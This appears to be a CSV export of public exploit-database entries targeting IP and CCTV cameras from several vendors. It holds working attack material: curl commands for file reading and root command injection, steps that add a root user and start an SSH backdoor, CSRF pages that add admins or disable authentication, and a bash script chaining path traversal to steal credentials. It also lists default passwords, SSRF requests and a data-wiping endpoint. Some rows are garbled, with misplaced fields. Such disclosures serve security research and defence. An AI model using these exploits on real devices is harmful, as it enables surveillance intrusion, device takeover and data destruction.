date,category,platform,author,device_detail,exploited_component,details,code
2023-04-06,Remote,Hardware,d1g@segfault.net,ABUS Security Camera TVIP 20000-21150,"LFI, RCE and SSH Root Access","# Exploit Title:ABUS Security Camera TVIP 20000-21150 - LFI, RCE and SSH Root Access
# Date:2023-02-16
# Exploit Author:d1g@segfault.net for NetworkSEC [NWSSA-001-2023]
# Vendor Homepage:https://www.abus.com
# Version/Model:TVIP 20000-21150 (probably many others)
# Tested on:GM ARM Linux 2.6, Server: Boa/0.94.14rc21
# CVE:CVE-2023-26609
#!/bin/bash
# ABUS Security Camera LFI
# MFT: Specify manufacture commands user name and password
#!/bin/bash
# ABUS Security Camera RCE
http://www.GM.com/
#EOF","0x00DESCRIPTION
During a recent engagement, a network camera was discovered. Web fuzzing
revealed a URL of
/device
containing output about running processes as well as a pretty complete
listing of webcontent which inevitably arose our suspicion.
More research revealed that files w/ known LFI and RCE issues were present,
leading to either arbitrary file reads or remote code execution, both w/
root privileges and using known default credentials (either admin:admin
or manufacture:erutcafunam).
After closer filesystem inspection, RCE led to a remote root SSH shell.
0x01IMPACT
The LFI vulnerability can be exploited using a URL of:
/cgi-bin/admin/fileread?READ.filePath=[filename]
and is able to read any file on the system.
The RCE vulnerability originates from a command injection and may be
exploited by calling a URL of:
/cgi-bin/mft/wireless_mft?ap=irrelevant;[command]
(as classy as it can get, we can also use the pipe ""|"" instead, and
linefeed a.k.a. ""%0a"" works as well)
effectively giving us remote code (or rather command) execution.
0x02 PROOF OF CONCEPT (PoC)
curl -iv ""http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1""
The script can be called like:
./LFI.sh /etc/passwd
to display the contents of the passwd file. When reading the configuration of
the BOA server (/etc/boa.conf), we find hardcoded credentials:
MFT manufacture erutcafunam
These can now be used to execute the RCE (based on command injection):
curl -iv ""http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless_mft?ap=testname;$1""
and can be called like:
./LFI.sh id
to display a user id of
uid=0(root) gid=0(root)
0x03SSH Remote Root Access
After having discovered the previously described vulnerabilities, multiple
attempts to spawn a nice reverse shell failed as the system was minimal
and did neither offer binaries like bash or netcat, nor any compilers or
scripting language interpreters to execute our code. Furthermore, binaries
that we transferred onto the system (for ARM little-endian architecture)
either resulted in ""Segmentation fault"" (mfsvenom) or as we saw later
""Illegal instruction"" (netcat for ARM).
We had to inspect the local attack surface and use the LOLBIN approach,
a.k.a. living off the land binaries available on the system.
In this case, the minimal and often busybox-included dropbear SSH daemon
became pretty handy.
To successfully implement a remote root SSH shell for persistance, several
steps had to be undertaken:
1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:
./RCE.sh ""/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key""
2) Then, add our user to the password file, e.g.:
./RCE.sh ""echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd""
3) Finally, start the server:
./RCE.sh ""/etc/dropbear/dropbear%20-E%20-F""
We can now SSH (using obsolete and insecure algorithms for both KeyExchange and HostKey)
into our rootshell:
sshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x
Welcome to
_____    __      ___       __     ___       _     _    _
|  ___|  /  \    / __ \    /  \   |  _ \    /  \   \ \ / /
| |___  / /\ \  | /__\ \  / /\ \  | | \ |  / /\ \   \ V /
|  ___|| |__| | |  _   / | |__| | | | | | | |__| |   \ /
| |    |  __  | | |  \ \ |  __  | | |_/ / |  __  |   | |
|_|    |_|  |_| |_|   \_\|_|  |_| |___ /  |_|  |_|   |_|
For further information check:
BusyBox v1.1.3 (2012.07.16-03:58+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
[d1g]# id
uid=0(root) gid=0(root)"
2023-04-01,WebApps,Python,Elias Hohl,GeoVision Camera GV-ADR2701,"Authentication Bypass,WebApps,Hardware,Chan Nyein Wai,Exploit Database,N/A
2023-03-25,./downloads/51041,""camp"" Raspberry Pi camera server 1.0 -  Authentication Bypass","# Exploit Title: GeoVision Camera GV-ADR2701 - Authentication Bypass
# Device name: GV-ADR2701
# Date: 26 December , 2020
# Exploit Author: Chan Nyein Wai
# Vendor Homepage: https://www.geovision.com.tw/
# Software Link: https://www.geovision.com.tw/download/product/
# Firmware Version: V1.00_2017_12_15
# Tested on: windows 10
# Exploitation","1. Capture The Login Request with burp, Do intercept request to response
Request:
PUT /LAPI/V1.0/Channel/0/System/Login HTTP/1.1
Host: 10.10.10.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0)
Gecko/20100101 Firefox/84.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Authorization: Basic dW5kZWZpbmVkOnVuZGVmaW5lZA==
Content-Length: 46
Origin: http://10.10.10.10
Connection: close
Referer: http://10.10.10.10/index.htm?clientIpAddr=182.168.10.10&IsRemote=0
Cookie: isAutoStartVideo=1
{""UserName"":""admin"",""Password"":""0X]&0D]]05""}
2. The following is the normal response when you login to the server.
HTTP/1.1 200 Ok
Content-Length: 170
Content-Type: text/plain
Connection: close
X-Frame-Options: SAMEORIGIN
""Response"": {
""ResponseURL"": ""/LAPI/V1.0/Channel/0/System/Login"",
""CreatedID"": -1,
""StatusCode"": 460,
""StatusString"": ""PasswdError"",
""Data"": ""null""
By editing the response to the following, you can successfully log in to
the web application.
HTTP/1.1 200 Ok
Content-Length: 170
Content-Type: text/plain
Connection: close
X-Frame-Options: SAMEORIGIN
""Response"": {
""ResponseURL"": ""/LAPI/V1.0/Channel/0/System/Login"",
""CreatedID"": -1,
""StatusCode"": 0,
""StatusString"": ""Succeed"",
""Data"": ""null"""
2021-11-02,WebApps,Multiple,LiquidWorm,i3 International Annexxus Cameras Ax-n 5.2.0,Application Logic Flaw,"# Exploit Title: i3 International Annexxus Cameras Ax-n 5.2.0 - Application Logic Flaw
# Date: 27.10.2021
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.i3international.com
Summary: The Annexxus camera 6MP provides 4 simultaneous,
Desc: The application doesn't allow creation of more than one","i3 International Annexxus Cameras Ax-n 5.2.0 Application Logic Flaw
Vendor: i3 International Inc.
Product web page: https://www.i3international.com
Affected version: V5.2.0 build 150317 (Ax46)
V5.0.9 build 151106 (Ax68)
V5.0.9 build 150615 (Ax78)
independently controlled digital pan-tilt-zoom (ePTZ) video
streams, which may be recorded or viewed live as well as a
built-in microphone and speaker allowing two way communication.
administrator account on the system. This also applies for
deletion of the administrative account. The logic behind this
restriction can be bypassed by parameter manipulation using
dangerous verbs like PUT and DELETE and improper server-side
validation. Once a normal account with 'viewer' or 'operator'
permissions has been added by the default admin user 'i3admin',
a PUT request can be issued calling the 'UserPermission' endpoint
with the ID of created account and set it to 'admin' userType,
successfully adding a second administrative account.
Tested on: App-webs/
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5688
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5688.php
27.10.2021
Make user ID 3 an Administrator:
PUT /PSIA/Custom/SelfExt/UserPermission/3 HTTP/1.1
Host: 192.168.1.1
Content-Length: 556
Cache-Control: max-age=0
Accept: */*
X-Requested-With: XMLHttpRequest
If-Modified-Since: 0
Authorization: Basic aTNhZG1pbjppM2FkbWlu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.1
Referer: http://192.168.1.1/doc/setup.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: i3userInfo80=aTNhZG1pbjppM2FkbWlu; i3userName80=i3admin
Connection: close
<?xml version='1.0' encoding='utf-8'?><UserPermission><id>3</id><userID>3</userID><userType>admin</userType><remotePermission><playBack>true</playBack><preview>true</preview><record>true</record><ptzControl>true</ptzControl><upgrade>true</upgrade><parameterConfig>true</parameterConfig><restartOrShutdown>true</restartOrShutdown><logOrStateCheck>true</logOrStateCheck><voiceTalk>true</voiceTalk><transParentChannel>true</transParentChannel><contorlLocalOut>true</contorlLocalOut><alarmOutOrUpload>true</alarmOutOrUpload></remotePermission></UserPermission>
HTTP/1.1 200 OK
Date: Wed, 27 Oct 2021 14:13:56 GMT
Server: App-webs/
Connection: close
Content-Length: 238
Content-Type: application/xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<ResponseStatus version=""1.0"" xmlns=""urn:psialliance-org"">
<requestURL>/PSIA/Custom/SelfExt/UserPermission/3</requestURL>
<statusCode>1</statusCode>
<statusString>OK</statusString>
</ResponseStatus>
Delete Administrator user ID 3:
DELETE /PSIA/Security/AAA/users/3 HTTP/1.1
Host: 192.168.1.1
Cache-Control: max-age=0
Accept: */*
X-Requested-With: XMLHttpRequest
If-Modified-Since: 0
Authorization: Basic aTNhZG1pbjppM2FkbWlu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Origin: http://192.168.1.1
Referer: http://192.168.1.1/doc/setup.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: i3userInfo80=aTNhZG1pbjppM2FkbWlu; i3userName80=i3admin
Connection: close
HTTP/1.1 200 OK
Date: Wed, 27 Oct 2021 14:20:17 GMT
Server: App-webs/
Connection: close
Content-Length: 213
Content-Type: application/xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<ResponseStatus version=""1.0"" xmlns=""urn:psialliance-org"">
<requestURL>/PSIA/Security/AAA/users/3</requestURL>
<statusCode>1</statusCode>
<statusString>OK</statusString>
</ResponseStatus>"
2021-09-02,WebApps,Hardware,icekam,Compro Technology IP Camera,' mjpegStreamer.cgi' Screenshot Disclosure,"# Exploit Title: Compro Technology IP Camera - ' mjpegStreamer.cgi' Screenshot Disclosure
# Date: 2021-09-30
# Exploit Author: icekam,xiao13,Rainbow,tfsec
# Software Link: http://www.comprotech.com.hk/
# Version: Compro IP70 2.08_7130218, IP570 2.08_7130520, IP60, TN540
# CVE : CVE-2021-40382
https://github.com/icekam/0day/blob/main/Compro-Technology-Camera-has-multiple-vulnerabilities.md","There is an unauthorized access vulnerability, which can lead to
unauthorized access to camera video screenshots.
Payload:
/mjpegStreamer.cgi
please refer to:"
2021-09-02,WebApps,Hardware,icekam,Compro Technology IP Camera,' index_MJpeg.cgi' Stream Disclosure,"# Exploit Title: Compro Technology IP Camera - ' index_MJpeg.cgi' Stream Disclosure
# Date: 2021-09-30
# Exploit Author: icekam,xiao13,Rainbow,tfsec
# Software Link: http://www.comprotech.com.hk/
# Version: Compro IP70 2.08_7130218, IP570 2.08_7130520, IP60, TN540
# CVE : CVE-2021-40381
https://github.com/icekam/0day/blob/main/Compro-Technology-Camera-has-multiple-vulnerabilities.md","Has an unauthorized access vulnerability, which can lead to unauthorized
access to the camera video page.
Payload:
/cgi-bin/view/index_MJpeg.cgi
please refer to:"
2021-09-02,WebApps,Hardware,icekam,Compro Technology IP Camera,'Multiple' Credential Disclosure,"# Exploit Title: Compro Technology IP Camera - 'Multiple' Credential Disclosure
# Date: 2021-09-30
# Exploit Author: icekam,xiao13,Rainbow,tfsec
# Software Link: http://www.comprotech.com.hk/
# Version: Compro IP70 2.08_7130218, IP570 2.08_7130520, IP60, TN540
# CVE : CVE-2021-40380
https://github.com/icekam/0day/blob/main/Compro-Technology-Camera-has-multiple-vulnerabilities.md","There are unauthorized access vulnerabilities, which can lead to the
disclosure of device administrator usernames and passwords or rstp
usernames and passwords.
Payload:
/cgi-bin/cameralist/cameralist.cgi
/cgi-bin/cameralist/setcamera.cgi?id=*
please refer to:"
2021-09-02,WebApps,Hardware,icekam,Compro Technology IP Camera,RTSP stream disclosure (Unauthenticated),"# Exploit Title: Compro Technology IP Camera - RTSP stream disclosure (Unauthenticated)
# Date: 2021-09-30
# Exploit Author: icekam,xiao13,Rainbow,tfsec
# Software Link: http://www.comprotech.com.hk/
# Version: Compro IP70 2.08_7130218, IP570 2.08_7130520, IP60, TN540
# CVE : CVE-2021-40379
https://github.com/icekam/0day/blob/main/Compro-Technology-Camera-has-multiple-vulnerabilities.md","Some devices have unauthorized access to rstp, which can lead to the
leakage of surveillance video stream information.
Payload:rstp://.../medias2
please refer to:"
2021-09-02,WebApps,Hardware,icekam,Compro Technology IP Camera,'killps.cgi' Denial of Service (DoS),"# Exploit Title: Compro Technology IP Camera - 'killps.cgi' Denial-of-Service (DoS)
# Date: 2021-09-30
# Exploit Author: icekam,xiao13,Rainbow,tfsec
# Software Link: http://www.comprotech.com.hk/
# Version: Compro IP70 2.08_7130218, IP570 2.08_7130520, IP60, TN540
# CVE : CVE-2021-40378
https://github.com/icekam/0day/blob/main/Compro-Technology-Camera-has-multiple-vulnerabilities.md","There is a backdoor prefabricated in the device in this path. Accessing the
file through the browser after logging in will cause the device to delete
all data (including the data of the camera itself).
Payload:Visit this page after logging in
/cgi-bin/support/killps.cgi
please refer to:"
2021-08-02,WebApps,Hardware,LiquidWorm,Panasonic Sanyo CCTV Network Camera 2.03-0x,Cross-Site Request Forgery (Change Password),"# Exploit Title: Panasonic Sanyo CCTV Network Camera 2.03-0x - 'Disable Authentication / Change Password' CSRF
# Date: 13.07.2021
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.panasonic.com
https://www.sanyo-av.com
https://panasonic.net/sanyo/cs/index.html
Summary: SANYO network camera and network optional board with the
Desc: The application interface allows users to perform certain actions","Panasonic Sanyo CCTV Network Camera 2.03-0x CSRF Disable Authentication / Change Password
Vendor: Panasonic Corporation | SANYO Electric Co., Ltd.
Product web page: https://www.panasonic.com
Affected version: Model: VCC-HD5600P, FrmVer: 2.03-06 (110315-00),  SubVer: 1.01-00 (100528-00)
Model: VDC-HD3300P, FrmVer: 2.03-08 (111222-00),  SubVer: 1.01-00 (100528-00)
Model: VDC-HD3300P, FrmVer: 1.02-05 (101005-07),  SubVer: 1.01-00 (100528-00)
Model: VCC-HD3300,  FrmVer: 2.03-02 (110318-00A), SubVer: 1.01-00 (100528-00)
Model: VDC-HD3100P, FrmVer: 2.03-00 (110204-02),  SubVer: 1.01-00 (100528-00)
Model: VCC-HD2100P, FrmVer: 2.03-02 (110318-00A), SubVer: 1.01-00 (100528-00)
latest H.264 compression technology provide the optimum surveillance
applications with high quality real time moving image at low bandwidth.
Simultaneous stream of H.264 and JPEG data and also COAX video out
to provide flexible solution for digital and analogue combined system.
via HTTP requests without performing any validity checks to verify the
requests. These actions can be exploited to perform authentication
detriment and account password change with administrative privileges if
a logged-in user visits a malicious web site.
Tested on: Embedded Linux
CGI
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5659
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5659.php
13.07.2021
[CSRF]
[Anonymous user log in = ON]
orororororororororororororor
[Change admin password]
<html>
<body>
<form action=""http://10.0.0.3:82/cgi-bin/user_registration.cgi"" method=""POST"">
<input type=""hidden"" name=""anonymous_sw"" value=""1"" /> <!--Disable authentication-->
<input type=""hidden"" name=""admin1_pw"" value=""Ztream0017"" /> <!--Change admin password-->
<input type=""hidden"" name=""admin2_pw"" value=""******"" />
<input type=""hidden"" name=""admin3_pw"" value=""******"" />
<input type=""hidden"" name=""operator_pw"" value=""********"" />
<input type=""hidden"" name=""guest_pw"" value=""*****"" />
<input type=""submit"" value=""Push"" />
</form>
</body>
</html>
[Defaults]
admin:admin
admin2:admin2
admin3:admin3
operator:operator
operator2:operator2
guest:guest"
2021-07-29,WebApps,Hardware,Ivan Nikolsky,Denver IP Camera SHO-110,Unauthenticated Snapshot,"# Exploit Title: Denver IP Camera SHO-110 - Unauthenticated Snapshot
# Date: 28 July 2021
# Exploit Author: Ivan Nikolsky (enty8080)
# Vendor Homepage: https://denver.eu/products/smart-home-security/denver-sho-110/c-1024/c-1243/p-3826
# Version: Denver SHO-110 (all firmware versions)
# Tested on: Denver SHO-110
http://<host>:8001/snapshot","Backdoor was found in a Denver SHO-110 IP Camera. Maybe other models also have this backdoor too.
So, the backdoor located in the camera's second http service, allows the attacker to get a snapshot through `/snapshot` endpoint. There are two http services in camera: first - served on port 80, and it requires authentication, and the second - served on port 8001, and it does not require authentication.
It's possible to write a script that will collect snapshots and add them to each other, so the attacker will be able to disclosure the camera stream.
PoC:"
2021-07-28,Remote,Hardware,Ivan Nikolsky,Denver Smart Wifi Camera SHC-150,'Telnet' Remote Code Execution (RCE),"# Exploit Title: Denver Smart Wifi Camera SHC-150 - 'Telnet' Remote Code Execution (RCE)
# Date: 27 July 2021
# Exploit Author: Ivan Nikolsky (enty8080)
# Vendor Homepage: https://denver.eu/products/smart-home-security/denver-shc-150/c-1024/c-1243/p-3824
# Version: Denver SHC-150 (all firmware versions)
# Tested on: Denver SHC-150","Backdoor was found in a Denver SHC-150 Smart Wifi Camera. Maybe other models also have this backdoor too.
So, backdoor is a factory telnet credential - `default`. Just open the telnet connection with the camera on port 23 and enter `default` (yes, on these cameras, telnet service is served on port 23). After this, you'll get a Linux shell. Backdoor allows an attacker to execute commands on OS lever through telnet.
PoC:
enty8080@Ivans-Air ~ % telnet 192.168.2.118 23
Trying 192.168.2.118...
Connected to pc192-168-2-118.
Escape character is '^]'.
goke login: default
$ ls /
bin      home     linuxrc  opt      run      tmp
dev      init     media    proc     sbin     usr
etc      lib      mnt      root     sys      var
$ pwd
/home/default
$ exit
Connection closed by foreign host.
enty8080@Ivans-Air ~ %"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,'addr' Remote Code Execution (Unauthenticated),"# Exploit Title: Selea Targa IP OCR-ANPR Camera - 'addr' Remote Code Execution (Unauthenticated)
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
#!/bin/bash
# Selea Targa IP OCR-ANPR Camera Unauthenticated Remote Code Execution
# Vendor: Selea s.r.l.
# Product web page: https://www.selea.com
# Affected version: Model: iZero
#                          Targa 512
#                          Targa 504
#                          Targa Semplice
#                          Targa 704 TKM
#                          Targa 805
#                          Targa 710 INOX
#                          Targa 750
#                          Targa 704 ILB
#                   Firmware: BLD201113005214
#                             BLD201106163745
#                             BLD200304170901
#                             BLD200304170514
#                             BLD200303143345
#                             BLD191118145435
#                             BLD191021180140
#                             BLD191021180140
#                   CPS: 4.013(201105)
#                        3.100(200225)
#                        3.005(191206)
#                        3.005(191112)
# Summary: IP camera with optical character recognition (OCR) software for automatic
# number plate recognition (ANPR) also equipped with ADR system that enables it to read
# the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
# of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
# plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
# this camera suitable for all installation conditions. Its built-in OCR software works
# as an automatic and independent system without the need of a computer, thus giving
# autonomy to the device even in the event of an interruption in the connection between
# the camera and the operations centre.
# Desc: Selea suffers from an authenticated command injection vulnerability. This can be
# exploited to inject and execute arbitrary shell commands as the www-data user through
# the 'addr' and 'port' HTTP GET parameters in utils.php page. Chaining the unauthenticated
# LFI issue an attacker can grab credentials, authenticate and execute system commands.
# =====================================================================================
# /mnt/app/scripts/address_check.sh:
# ----------------------------------
# 01: #!/bin/sh
# 02: . /mnt/app/scripts/env.sh
# 03: . /mnt/app/scripts/log.sh
# 04:
# 05: CMD=""$1""
# 06: ADDR=""$2""
# 07: PORT=""$3""
# 08:
# 09: if [ ""$CMD"" == ""ping"" ]; then
# 10:   RESULT=$(/bin/ping -I eth0 -W 1 -q -c 1 ""$ADDR"" 2>&1 )
# 11: elif [ ""$CMD"" == ""port"" ]; then
# 12:   log ""/usr/bin/nc -w 1 -v -z $ADDR $PORT""
# 13:   RESULT=$(/usr/bin/nc -w 1 -v -z ""$ADDR"" ""$PORT"" 2>&1 )
# 14: fi
# 15:
# 16: echo -e ""$RESULT""
# =====================================================================================
# Tested on: GNU/Linux 3.10.53 (armv7l)
#            PHP/5.6.22
#            selea_httpd
#            HttpServer/0.1
#            SeleaCPSHttpServer/1.1
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2021-5620
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5620.php
# 07.11.2020
# PoC chained exploit (as admin):
# solidsnake@metalgear:~/prive$ ./selea.sh 192.168.1.17 id
# Password found: testingus
# Using Authorization: YWRtaW46dGVzdGluZ3VzCg==
# Using command: id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)","IP=$1
CMD=$2
PWD=`curl -s http://${IP}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fmnt/data/auth/users.json |grep -oP 'root_pwd"": ""\K.*?(?="",)'`
echo 'Password found: '${PWD}
AUTH=$(echo admin:${PWD} | base64)
echo 'Using Authorization: '${AUTH}
echo 'Using command: '${CMD}
curl -s ""http://${IP}/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\$(${CMD})&type=port&port=80"" -H ""Authorization: Basic ${AUTH}"" |grep -oP '1.3.3.7\K.*?(?="")'"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa 512 IP OCR-ANPR Camera,Stream Disclosure (Unauthenticated),"# Exploit Title: Selea Targa IP OCR-ANPR Camera - RTP/RTSP/M-JPEG Stream Disclosure (Unauthenticated)
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: The ANPR camera suffers from an unauthenticated and unauthorized live stream","Selea Targa IP OCR-ANPR Camera Unauthenticated RTP/RTSP/M-JPEG Stream Disclosure
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
disclosure when p1.mjpg or p1.264 is called.
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5619
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5619.php
07.11.2020
Connection to RTP/RTSP stream: rtsp://192.168.1.17/p1.264
Connection to M-JPEG stream: http://192.168.1.17/p1.mjpg"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,CSRF Add Admin,"# Exploit Title: Selea Targa IP OCR-ANPR Camera - CSRF Add Admin
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: The application interface allows users to perform certain actions via HTTP requests","Selea Targa IP OCR-ANPR Camera CSRF Add Admin Exploit
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
without performing any validity checks to verify the requests. This can be exploited to
perform certain actions with administrative privileges if a logged-in user visits a malicious
web site.
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5618
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5618.php
07.11.2020
Add Admin:
<html>
<body>
<script>
function submitRequest()
var xhr = new XMLHttpRequest();
xhr.open(""POST"", ""http:\/\/192.168.1.17\/save_params.php"", true);
xhr.setRequestHeader(""Accept"", ""*\/*"");
xhr.setRequestHeader(""Accept-Language"", ""en-US,en;q=0.9"");
xhr.setRequestHeader(""Content-Type"", ""multipart\/form-data; boundary=cfgboundary-----------------------1607475234133"");
xhr.withCredentials = true;
var body = ""--cfgboundary-----------------------1607475234133\r\n"" +
""Content-Disposition: form-data; name=\""set_params\""\r\n"" +
""\r\n"" +
""upload\r\n"" +
""--cfgboundary-----------------------1607475234133\r\n"" +
""Content-Disposition: form-data; name=\""user_file\""; filename=\""set_params.dat\""\r\n"" +
""Content-Type: application/octet-stream\r\n"" +
""\r\n"" +
""[SECURITY.USERS]\r\n"" +
""security-users-0-username = testingus\r\n"" +
""security-users-0-password = testingus\r\n"" +
""security-users-0-rights = 2\r\n"" +
""security-users-1-username = \r\n"" +
""security-users-1-password = \r\n"" +
""security-users-1-rights = 0\r\n"" +
""security-users-2-username = \r\n"" +
""security-users-2-password = \r\n"" +
""security-users-2-rights = 0\r\n"" +
""security-users-3-username = \r\n"" +
""security-users-3-password = \r\n"" +
""security-users-3-rights = 0\r\n"" +
""security-allow_viewers_storage_access = 1\r\n"" +
""CFG_ROOTPASS = admin\r\n"" +
""\r\n"" +
""--cfgboundary-----------------------1607475234133--\r\n"";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
</script>
<form action=""#"">
<input type=""button"" value=""Add Admin"" onclick=""submitRequest();"" />
</form>
</body>
</html>"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,Multiple SSRF (Unauthenticated),"# Exploit Title: Selea Targa IP OCR-ANPR Camera - Multiple SSRF (Unauthenticated)
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the","Selea Targa IP OCR-ANPR Camera Unauthenticated SSRF
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
Selea ANPR camera within several functionalities. The application parses user supplied
data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image
request or check DNS for IP notification. Since no validation is carried out on the
parameters, an attacker can specify an external domain and force the application to
make an HTTP request to an arbitrary destination host. This can be used by an external
attacker for example to bypass firewalls and initiate a service and network enumeration
on the internal network through the affected application.
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5617
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php
07.11.2020
Request:
POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE HTTP/1.1
Host: 192.168.1.17
{""test_type"":""ip"",""test_debug"":false,""ipnotify_type"":""http/get"",""ipnotify_address"":""http://127.0.0.1:80"",""ipnotify_username"":"""",""ipnotify_password"":"""",""ipnotify_port"":""0"",""ipnotify_content_type"":"""",""ipnotify_template"":""""}
Response (port 80):
{""bandwidth"": 1.3571428571428572,""elapsed_ms"": 14,""result"": ""OK"",""size"": 19}
Response (port 8080):
{""code"": 500,""error"": ""Error sending notification: Connection refused""}
Request:
POST /cps/test_url HTTP/1.1
Host: 192.168.1.17
{""url"":""http://127.0.0.1:80""}:
Response (port 80):
